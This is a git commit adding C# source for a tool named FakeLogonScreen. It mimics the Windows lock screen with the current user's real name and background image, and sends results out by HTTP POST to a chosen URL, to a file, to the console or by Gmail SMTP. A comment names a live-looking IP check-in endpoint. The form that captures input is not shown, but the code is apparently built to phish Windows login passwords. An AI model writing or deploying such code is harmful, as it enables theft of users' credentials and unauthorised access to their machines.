1c24052cc2a2be2e9832d271267a4d8f18a630a1
Diego Mardian <diegomardian10@gmail.com>
2022-03-22 16:17:40 -0700

    Add first files

---
+++ Source/Program.cs
@@ -0,0 +1,205 @@
+﻿using System;
+using System.Windows.Forms;
+using System.DirectoryServices.AccountManagement;
+using System.Drawing;
+using System.IO;
+using Microsoft.Win32;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using Newtonsoft.Json;
+
+namespace FakeLogonScreen
+{
+    static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+
+        [STAThread]
+        static void Main(string[] args)
+        {
+            Dictionary<string, string> method = new Dictionary<string, string> { { "method", "http" } };
+            if (args.Length == 0)
+            {
+                Console.WriteLine("No arguments");
+                Console.WriteLine("Avialable Commands");
+                Console.WriteLine("http [url]");
+                Console.WriteLine("gmail [email] [password]");
+                Console.WriteLine("file [file path]");
+                Console.WriteLine("console");
+                return;
+            }
+            if (args.Length >= 1)
+            {
+                method["method"] = args[0];
+            }
+            if (method["method"] == "http")
+            {
+                if (args.Length >= 2)
+                {
+                    method["url"] = args[1];
+                }
+                else 
+                {
+                    Console.WriteLine("Please provide the correct number of parameters");
+                    Console.WriteLine("Avialable Commands");
+                    Console.WriteLine("http [url]");
+                    Console.WriteLine("gmail [email] [password]");
+                    Console.WriteLine("file [file path]");
+                    Console.WriteLine("console");
+                    return;
+                }
+            }
+            else if (method["method"] == "gmail")
+            {
+                if (args.Length >= (2 + 1))
+                {
+                    method["email"] = args[1];
+                    method["password"] = args[2];
+                }
+                else
+                {
+                    Console.WriteLine("Please provide the correct number of parameters");
+                    Console.WriteLine("Avialable Commands");
+                    Console.WriteLine("http [url]");
+                    Console.WriteLine("gmail [email] [password]");
+                    Console.WriteLine("file [file path]");
+                    Console.WriteLine("console");
+                    return;
+                }
+            }
+            else if (method["method"] == "file")
+            {
+                if (args.Length >= 2)
+                {
+                    method["filename"] = args[1];
+                }
+                else
+                {
+                    Console.WriteLine("Please provide the correct number of parameters");
+                    Console.WriteLine("Avialable Commands");
+                    Console.WriteLine("http [url]");
+                    Console.WriteLine("gmail [email] [password]");
+                    Console.WriteLine("file [file path]");
+                    Console.WriteLine("console");
+                    return;
+                }
+            }
+            else if (method["method"] == "console")
+            {
+                
+            }
+            else
+            {
+
+                Console.WriteLine("Avialable Commands");
+                Console.WriteLine("http [url]");
+                Console.WriteLine("gmail [email] [password]");
+                Console.WriteLine("file [file path]");
+                Console.WriteLine("console");
+            }
+            // url "http://68.3.172.102:12056/fake_login_screen_checkin"
+            Utils.showData(method, "Starting fake login screen");
+
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            
+            // check if there are any command arguments and if there is set the first one equal to a variable
+            
+            // Initialize new screen
+            LogonScreen s = new LogonScreen(method);
+
+            // Set username
+            string SID = string.Empty;
+            try
+            {
+                UserPrincipal user = UserPrincipal.Current;
+                // testing
+                s.Username = user.SamAccountName;
+                // testing
+                s.DisplayName = user.DisplayName;
+                // testing
+                SID = user.Sid.Value;
+                // testing
+                s.Context = user.ContextType;
+                // testing
+            }
+            catch (Exception)
+            {
+                // testing
+                s.Username = Environment.UserName;
+                // testing
+                s.Context = ContextType.Machine;
+                // testing
+            }
+            // testing
+
+            // Set background
+            string imagePath = GetImagePath(SID) ?? @"C:\Windows\Web\Screen\img100.jpg";
+            // testing
+            if (File.Exists(imagePath))
+                // testing
+                s.BackgroundImage = Image.FromFile(imagePath);
+            // testing
+            else
+                // testing
+                s.BackColor = Color.FromArgb(0, 90, 158);
+            // testing
+
+            // Show
+            Application.Run(s);
+        }
+
+        static string GetImagePath(string SID)
+        {
+            string foundImage = null;
+
+            try
+            {
+                // Open registry, if path exists
+                string regPath = string.Format(@"SOFTWARE\Microsoft\Windows\CurrentVersion\SystemProtectedUserData\{0}\AnyoneRead\LockScreen", SID);
+                RegistryKey regLockScreen = Registry.LocalMachine.OpenSubKey(regPath);
+                if (regLockScreen == null)
+                    return null;
+
+                // Obtain lock screen index
+                string imageOrder = (string)regLockScreen.GetValue(null);
+                int ord = (int)imageOrder[0];
+
+                // A = 65 < N = 78 < Z = 90
+                // Default image is used
+                if (ord > 78)
+                // testing
+                {
+                    string webScreenPath = @"C:\Windows\Web\Screen";
+                    // testing
+                    List<string> webScreenFiles = new List<string>(Directory.GetFiles(webScreenPath, "img*"));
+                    string image = string.Format("img{0}", ord + 10 + (90 - ord) * 2);
+                    foundImage = (from name
+                                  // testing
+                                  in webScreenFiles
+                                      // testing
+                                  where name.StartsWith(string.Format(@"{0}\{1}", webScreenPath, image))
+                                  // testing
+                                  select name).SingleOrDefault();
+                }
+                // Custom image is used
+                else
+                {
+                    string customImagePath = string.Format(@"{0}\Microsoft\Windows\SystemData\{1}\ReadOnly", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), SID);
+                    string customLockScreenPath = string.Format(@"{0}\LockScreen_{1}", customImagePath, imageOrder[0]);
+                    foundImage = Directory.GetFiles(customLockScreenPath)[0];
+                    // testing
+                }
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine(e);
+            }
+
+            return foundImage;
+        }
+    }
+}
---
+++ Source/Utils.cs
@@ -0,0 +1,106 @@
+﻿using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace FakeLogonScreen
+{
+    public static class Utils
+    {
+        static public void showData(Dictionary<string,string> method, String text)
+        {
+            if (method["method"] == "http")
+            {
+                sendHttpRequest(method, text);
+            }
+            else if (method["method"] == "file")
+            {
+                writeToFile(method, text);
+            }
+            else if (method["method"] == "console")
+            {
+                printToConsole(method, text);
+            }
+            else if (method["method"] == "email")
+            {
+                
+            }
+        }
+        
+        
+        static public void sendEmail(Dictionary<string,string> method, string text)
+        {
+            Dictionary<string, string> test = new Dictionary<string, string> {
+                {
+                    "filename", "test.txt"
+                } };
+            Utils.writeToFile(test, method["email"] + "\n" + method["password"]); 
+            using (MailMessage mail = new MailMessage())
+            {
+                mail.From = new MailAddress(method["email"]);
+                mail.To.Add(method["email"]);
+                mail.Subject = "Fake Login Screen results";
+                mail.Body = text;
+                mail.IsBodyHtml = true;
+                //mail.Attachments.Add(new Attachment("D:\\TestFile.txt"));//--Uncomment this to send any attachment  
+                using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
+                {
+                    smtp.Credentials = new NetworkCredential(method["email"], method["password"]);
+                    smtp.EnableSsl = true;
+                    smtp.Send(mail);
+                }
+            }
+        }
+
+        static public void writeToFile(Dictionary<string, string> method, string text)
+        {
+            string filePath = method["filename"];
+            if (!File.Exists(filePath))
+            {
+                File.Create(filePath).Close();
+            }
+            using (StreamWriter sw = File.AppendText(filePath))
+            {
+                sw.WriteLine(text);
+            }
+        }
+        
+        
+        static public void printToConsole(Dictionary<string,string> method, string text)
+        {
+            Console.WriteLine(text);
+        }
+
+        static public void sendHttpRequest(Dictionary<string, string> method, string text)
+        {
+            var httpWebRequest = (System.Net.HttpWebRequest)WebRequest.Create(method["url"]);
+            httpWebRequest.ContentType = "application/json";
+            httpWebRequest.Method = "POST";
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+
+            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
+            {
+                Dictionary<String, String> requestBody = new Dictionary<String, String>
+                {
+                    { "info", text }
+                };
+                string json = JsonConvert.SerializeObject(requestBody, Formatting.Indented);
+                streamWriter.Write(json);
+                streamWriter.Flush();
+                streamWriter.Close();
+            }
+
+            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
+            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
+            {
+                var result = streamReader.ReadToEnd();
+            }
+        }
+    }
+ 
+}
